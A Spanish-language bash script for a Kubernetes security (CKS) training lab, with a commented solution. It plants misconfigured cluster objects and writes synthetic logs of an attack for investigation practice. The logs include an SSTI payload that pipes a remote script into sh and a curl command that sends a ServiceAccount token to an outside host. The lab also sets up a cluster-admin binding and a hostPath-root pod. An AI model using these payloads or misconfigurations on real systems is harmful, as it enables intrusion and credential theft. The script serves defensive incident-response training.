#!/usr/bin/env bash
#
# CKS 1.34 - Dominio 6.3: Investigate and identify phases of attack and bad actors within the environment
# Peso en el examen: 4
# Referencia: https://github.com/cncf/curriculum/raw/master/CKS_Curriculum%20v1.34.pdf
#
# Break & Fix: simula el rastro dejado por un ataque real contra un
# microservicio expuesto, para que practiques la reconstrucción de la
# cadena de ataque (Cyber Kill Chain / MITRE ATT&CK for Containers) a
# partir de logs y del estado del cluster.
#
# SOLO para una VM de laboratorio descartable (kind/minikube/k3d). No
# habilita audit logging real en el API server: genera evidencia
# sintética pero realista (logs + objetos reales inofensivos) para que
# la investigación sea end-to-end sin tocar la configuración del
# control plane.

set -euo pipefail

LAB_NS="cks-6-3-lab"
VICTIM_NS="payments"
LAB_DIR="${HOME}/cks-lab/6.3-investigate-attack"
AUDIT_LOG="${LAB_DIR}/kube-audit.log"
ACCESS_LOG="${LAB_DIR}/frontend-web-access.log"
APP_LOG="${LAB_DIR}/frontend-web-container.log"

require_lab_context() {
  command -v kubectl >/dev/null 2>&1 || { echo "Falta kubectl."; exit 1; }
  local ctx
  ctx="$(kubectl config current-context 2>/dev/null || echo "")"
  if [[ -z "$ctx" ]]; then
    echo "No hay contexto de kubectl activo. Abortando."
    exit 1
  fi
  if [[ "${LAB_FORCE:-0}" != "1" ]] && ! [[ "$ctx" =~ (kind|minikube|k3d|k3s|docker-desktop|lab|test) ]]; then
    echo "El contexto actual es '$ctx' y no parece un cluster de laboratorio descartable."
    echo "Si estás seguro de que es seguro, reejecutá con LAB_FORCE=1."
    exit 1
  fi
  echo "Usando contexto: $ctx"
}

ts() { date -u -d "@$((START + $1))" +"%Y-%m-%dT%H:%M:%SZ"; }
ts_clf() { date -u -d "@$((START + $1))" +"%d/%b/%Y:%H:%M:%S +0000"; }

break_lab() {
  mkdir -p "$LAB_DIR"

  kubectl create namespace "$LAB_NS" --dry-run=client -o yaml | kubectl apply -f - >/dev/null
  kubectl create namespace "$VICTIM_NS" --dry-run=client -o yaml | kubectl apply -f - >/dev/null

  # --- Vulnerabilidad raíz: la ServiceAccount del frontend tiene cluster-admin ---
  kubectl apply -f - >/dev/null <<'YAML'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: frontend-web-sa
  namespace: cks-6-3-lab
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: frontend-web-full-access
subjects:
  - kind: ServiceAccount
    name: frontend-web-sa
    namespace: cks-6-3-lab
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
YAML

  # --- App pública vulnerable (punto de entrada) ---
  kubectl apply -f - >/dev/null <<'YAML'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: frontend-web
  namespace: cks-6-3-lab
  labels:
    app: frontend-web
spec:
  replicas: 1
  selector:
    matchLabels:
      app: frontend-web
  template:
    metadata:
      labels:
        app: frontend-web
    spec:
      serviceAccountName: frontend-web-sa
      containers:
        - name: frontend-web
          image: busybox:1.36
          command: ["sh", "-c", "sleep infinity"]
YAML

  # --- Servicio "víctima" en otro namespace (para la fase de lateral movement) ---
  kubectl apply -f - >/dev/null <<'YAML'
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
  namespace: payments
type: Opaque
stringData:
  username: payments_svc
  password: sample-not-a-real-secret
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: payments-api
  namespace: payments
  labels:
    app: payments-api
spec:
  replicas: 1
  selector:
    matchLabels:
      app: payments-api
  template:
    metadata:
      labels:
        app: payments-api
    spec:
      containers:
        - name: payments-api
          image: busybox:1.36
          command: ["sh", "-c", "sleep infinity"]
YAML

  # --- Persistencia: CronJob disfrazado de tarea legítima ---
  kubectl apply -f - >/dev/null <<'YAML'
apiVersion: batch/v1
kind: CronJob
metadata:
  name: cache-warmup
  namespace: cks-6-3-lab
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          restartPolicy: OnFailure
          containers:
            - name: cache-warmup
              image: busybox:1.36
              command: ["sh", "-c", "echo heartbeat $(date) >> /tmp/.cache-state"]
YAML

  # --- Escalada de privilegios: pod con hostPath "/" y hostPID ---
  kubectl apply -f - >/dev/null <<'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: node-debug-tools
  namespace: cks-6-3-lab
  labels:
    purpose: debug
spec:
  hostPID: true
  containers:
    - name: node-debug-tools
      image: busybox:1.36
      command: ["sh", "-c", "sleep infinity"]
      volumeMounts:
        - name: hostroot
          mountPath: /host
  volumes:
    - name: hostroot
      hostPath:
        path: /
        type: Directory
YAML

  kubectl wait --for=condition=Ready pod -l purpose=debug -n "$LAB_NS" --timeout=60s >/dev/null 2>&1 || true

  # --- Evidencia de la fase de escalada dejada en el "nodo" vía el hostPath ---
  kubectl exec -n "$LAB_NS" node-debug-tools -- sh -c 'echo "# dropped via hostPath, revisar" > /host/tmp/.systemd-helper 2>/dev/null' >/dev/null 2>&1 || true

  # --- Línea de tiempo sintética: hace 20 minutos ---
  START=$(( $(date +%s) - 1200 ))

  # 1) Initial access / execution: RCE vía SSTI en el frontend público
  cat > "$ACCESS_LOG" <<EOF
203.0.113.66 - - [$(ts_clf 0)] "GET /api/render?tpl=%7B%7Bself.__init__.__globals__.__builtins__.__import__('os').popen('id').read()%7D%7D HTTP/1.1" 200 512 "-" "python-requests/2.31.0"
203.0.113.66 - - [$(ts_clf 15)] "GET /api/render?tpl=%7B%7Bself.__init__.__globals__.__builtins__.__import__('os').popen('curl+-s+http://198.51.100.23/stage2.sh+|sh').read()%7D%7D HTTP/1.1" 200 480 "-" "python-requests/2.31.0"
EOF

  cat > "$APP_LOG" <<EOF
$(ts 15) INFO  rendering template request from 203.0.113.66
$(ts 16) WARN  unexpected shell invocation detected in template engine
$(ts 280) INFO  curl -s -X POST https://198.51.100.23/collect --data-binary @/var/run/secrets/kubernetes.io/serviceaccount/token
$(ts 281) INFO  exfil response: 200 OK (247 bytes sent)
EOF

  # 2) Discovery -> 3) Credential access -> 4) Lateral movement -> 5) Persistence
  #    -> 6) Privilege escalation -> 7) Defense evasion, vistos desde el audit log
  {
    printf '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"a1b2c3d4-0001","stage":"ResponseComplete","requestURI":"/api/v1/secrets","verb":"list","user":{"username":"system:serviceaccount:cks-6-3-lab:frontend-web-sa","groups":["system:serviceaccounts","system:serviceaccounts:cks-6-3-lab","system:authenticated"]},"sourceIPs":["10.244.1.7"],"objectRef":{"resource":"secrets","apiVersion":"v1"},"responseStatus":{"code":200},"requestReceivedTimestamp":"%s","stageTimestamp":"%s"}\n' "$(ts 30)" "$(ts 30)"
    printf '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"a1b2c3d4-0002","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/payments/secrets/db-credentials","verb":"get","user":{"username":"system:serviceaccount:cks-6-3-lab:frontend-web-sa","groups":["system:serviceaccounts","system:serviceaccounts:cks-6-3-lab","system:authenticated"]},"sourceIPs":["10.244.1.7"],"objectRef":{"resource":"secrets","namespace":"payments","name":"db-credentials","apiVersion":"v1"},"responseStatus":{"code":200},"requestReceivedTimestamp":"%s","stageTimestamp":"%s"}\n' "$(ts 45)" "$(ts 45)"
    printf '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"a1b2c3d4-0003","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/payments/pods/payments-api-7c9d4f8b7-k2x9q/exec","verb":"create","user":{"username":"system:serviceaccount:cks-6-3-lab:frontend-web-sa","groups":["system:serviceaccounts","system:serviceaccounts:cks-6-3-lab","system:authenticated"]},"sourceIPs":["10.244.1.7"],"objectRef":{"resource":"pods","subresource":"exec","namespace":"payments","name":"payments-api-7c9d4f8b7-k2x9q","apiVersion":"v1"},"responseStatus":{"code":101},"requestReceivedTimestamp":"%s","stageTimestamp":"%s"}\n' "$(ts 70)" "$(ts 70)"
    printf '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"a1b2c3d4-0004","stage":"ResponseComplete","requestURI":"/apis/batch/v1/namespaces/cks-6-3-lab/cronjobs","verb":"create","user":{"username":"system:serviceaccount:cks-6-3-lab:frontend-web-sa","groups":["system:serviceaccounts","system:serviceaccounts:cks-6-3-lab","system:authenticated"]},"sourceIPs":["10.244.1.7"],"objectRef":{"resource":"cronjobs","namespace":"cks-6-3-lab","name":"cache-warmup","apiVersion":"batch/v1"},"responseStatus":{"code":201},"requestReceivedTimestamp":"%s","stageTimestamp":"%s"}\n' "$(ts 150)" "$(ts 150)"
    printf '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"a1b2c3d4-0005","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/cks-6-3-lab/pods","verb":"create","user":{"username":"system:serviceaccount:cks-6-3-lab:frontend-web-sa","groups":["system:serviceaccounts","system:serviceaccounts:cks-6-3-lab","system:authenticated"]},"sourceIPs":["10.244.1.7"],"objectRef":{"resource":"pods","namespace":"cks-6-3-lab","name":"node-debug-tools","apiVersion":"v1"},"responseStatus":{"code":201},"requestReceivedTimestamp":"%s","stageTimestamp":"%s"}\n' "$(ts 200)" "$(ts 200)"
    printf '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"a1b2c3d4-0006","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/cks-6-3-lab/events","verb":"deletecollection","user":{"username":"system:serviceaccount:cks-6-3-lab:frontend-web-sa","groups":["system:serviceaccounts","system:serviceaccounts:cks-6-3-lab","system:authenticated"]},"sourceIPs":["10.244.1.7"],"objectRef":{"resource":"events","namespace":"cks-6-3-lab","apiVersion":"v1"},"responseStatus":{"code":200},"requestReceivedTimestamp":"%s","stageTimestamp":"%s"}\n' "$(ts 260)" "$(ts 260)"
  } > "$AUDIT_LOG"

  cat <<EOF

============================================================
 INCIDENTE DETECTADO - namespace '$LAB_NS' (y '$VICTIM_NS')
============================================================

Síntoma: apareció actividad inesperada en el cluster. Tenés
tres fuentes de evidencia en:

  $LAB_DIR/
    ├── frontend-web-access.log   (logs del ingress/app pública)
    ├── frontend-web-container.log (stdout del contenedor frontend-web)
    └── kube-audit.log             (audit log del API server, formato audit.k8s.io/v1)

Además el cluster tiene objetos reales que podés inspeccionar con:

  kubectl get all,cronjob,rolebinding,clusterrolebinding -n $LAB_NS
  kubectl get clusterrolebinding -o wide | grep frontend-web
  kubectl get secret,deploy -n $VICTIM_NS

TU TAREA (investigación, sin automatizar el arreglo):

  1. Reconstruí la cadena de ataque cruzando los 3 logs y mapeá
     cada evento a una fase (Cyber Kill Chain / MITRE ATT&CK for
     Containers): Initial Access, Execution, Discovery,
     Credential Access, Lateral Movement, Persistence,
     Privilege Escalation, Defense Evasion, Exfiltration.
  2. Identificá a los "bad actors": la IP externa del atacante,
     la IP de destino de la exfiltración, y la identidad interna
     comprometida (ServiceAccount y su origen: qué pod, qué IP
     de pod usó para hablar con el API server).
  3. Encontrá qué permiso mal configurado permitió que el
     compromiso de un solo pod terminara en control total del
     cluster.
  4. Remediá: eliminá los objetos maliciosos que quedaron vivos
     en el cluster y quitá el permiso excesivo que hizo posible
     la escalada, sin romper la app legítima (payments-api debe
     seguir funcionando).

Se considera resuelto cuando:
  - No queda ningún CronJob ni Pod sospechoso (con hostPath o
    de nombre 'node-debug-tools'/'cache-warmup') en '$LAB_NS'.
  - 'kubectl auth can-i --list --as=system:serviceaccount:$LAB_NS:frontend-web-sa'
    ya NO muestra privilegios de cluster-admin.
  - El namespace '$VICTIM_NS' y su Deployment 'payments-api' siguen intactos.

EOF
}

break_lab_wrapper() {
  require_lab_context
  break_lab
}

break_lab_wrapper "$@"

# ============================================================
# SOLUCIÓN PASO A PASO (comentado - no se ejecuta)
# ============================================================
#
# 1) Reconstrucción de la línea de tiempo (fases del ataque):
#
#    - Initial Access / Execution (t+0 a t+16s, frontend-web-access.log
#      y frontend-web-container.log): la IP externa 203.0.113.66 explota
#      una inyección SSTI en /api/render para ejecutar comandos dentro
#      del contenedor 'frontend-web'.
#
#    - Discovery (t+30s, kube-audit.log evento 0001): usando el token
#      de la ServiceAccount montada en el pod, el atacante lista
#      secrets en todo el cluster (verb=list, resource=secrets,
#      sourceIPs=["10.244.1.7"] = IP del pod frontend-web).
#
#    - Credential Access (t+45s, evento 0002): obtiene el secret
#      'db-credentials' en el namespace 'payments'.
#
#    - Lateral Movement (t+70s, evento 0003): abre un exec (verb=create,
#      subresource=exec) contra el pod 'payments-api-...' en 'payments'.
#
#    - Persistence (t+150s, evento 0004): crea el CronJob 'cache-warmup'
#      en '$LAB_NS' disfrazado de tarea de mantenimiento.
#
#    - Privilege Escalation (t+200s, evento 0005): crea el Pod
#      'node-debug-tools' con hostPath en "/" y hostPID:true, lo que le
#      da acceso al filesystem del nodo (confirmado por el archivo
#      /tmp/.systemd-helper dejado dentro de /host).
#
#    - Defense Evasion (t+260s, evento 0006): borra los Events del
#      namespace (deletecollection) para dificultar la investigación.
#
#    - Exfiltration (t+280s, frontend-web-container.log): envía el
#      token de la ServiceAccount por POST a 198.51.100.23/collect.
#
#    Bad actors identificados:
#      - Atacante externo: 203.0.113.66
#      - Destino de exfiltración: 198.51.100.23
#      - Identidad interna comprometida:
#        system:serviceaccount:cks-6-3-lab:frontend-web-sa
#        (usada desde el pod frontend-web, IP 10.244.1.7)
#
#    Causa raíz: el ClusterRoleBinding 'frontend-web-full-access' le da
#    cluster-admin a una ServiceAccount de un servicio público, así que
#    un simple RCE en la app se convirtió en compromiso total del cluster.
#
# 2) Remediación:
#
#    # Eliminar los artefactos de persistencia y escalada
#    kubectl delete cronjob cache-warmup -n cks-6-3-lab
#    kubectl delete pod node-debug-tools -n cks-6-3-lab
#
#    # Quitar el permiso excesivo que hizo posible la escalada
#    kubectl delete clusterrolebinding frontend-web-full-access
#
#    # (opcional pero recomendado) reemplazar por un Role de mínimo
#    # privilegio si frontend-web realmente necesita acceso a la API
#    # kubectl apply -f role-minimo-necesario.yaml
#
#    # Rotar la credencial comprometida: al borrar el binding el token
#    # ya no sirve para escalar, pero conviene recrear la SA/pod para
#    # invalidar el token que se filtró
#    kubectl delete pod -n cks-6-3-lab -l app=frontend-web
#
# 3) Verificación:
#
#    kubectl auth can-i --list --as=system:serviceaccount:cks-6-3-lab:frontend-web-sa
#      -> ya no debe listar recursos de cluster-admin
#
#    kubectl get cronjob,pod -n cks-6-3-lab
#      -> no debe quedar 'cache-warmup' ni 'node-debug-tools'
#
#    kubectl get deploy,secret -n payments
#      -> 'payments-api' y 'db-credentials' siguen intactos
#
# 4) Limpieza completa del laboratorio (cuando termines):
#
#    kubectl delete namespace cks-6-3-lab payments
#    kubectl delete clusterrolebinding frontend-web-full-access --ignore-not-found
#    rm -rf "$HOME/cks-lab/6.3-investigate-attack"